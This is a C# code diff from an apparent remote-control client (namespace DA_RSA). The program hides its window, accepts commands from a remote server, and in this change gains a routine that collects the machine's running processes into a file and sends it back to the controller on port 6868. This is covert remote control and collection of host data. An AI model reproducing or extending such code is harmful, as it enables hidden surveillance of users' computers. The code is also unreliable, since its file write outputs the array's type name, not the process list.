@@ -47,13 +47,6 @@ namespace DA_RSA
             this.Hide();
         }
 
-        public Process[] GetProcessList()
-        {
-            Process[] processlist = Process.GetProcesses();
-
-            return processlist;
-        }
-
         public void Receive()
         {
 
@@ -111,7 +104,9 @@ namespace DA_RSA
                         }
                         else if (cmd == "c")
                         {
-                            //get process
+                            IPEndPoint ipep = (IPEndPoint)server;
+                            ipep.Port = 6868;
+                            getProcessList(ipep.Address, ipep.Port);//get process
                         }
                         else if (cmd == "d")
                         { 
@@ -126,6 +121,18 @@ namespace DA_RSA
                 }
             
             }
+        }
+
+        public void getProcessList(IPAddress ip, int i)
+        {
+            Process[] p = Process.GetProcesses();
+
+            StreamWriter sw = new StreamWriter(Directory.GetCurrentDirectory() + "\\processe.txt");
+            sw.Write(p);
+            sw.Flush();
+            sw.Close();
+
+            send_data_sync(Directory.GetCurrentDirectory() + "\\processe.txt", "processe.txt", ip, i);
         }
         public void send_data_sync(object filename, object safefilename, IPAddress sendTO, int portSendTO)
         {
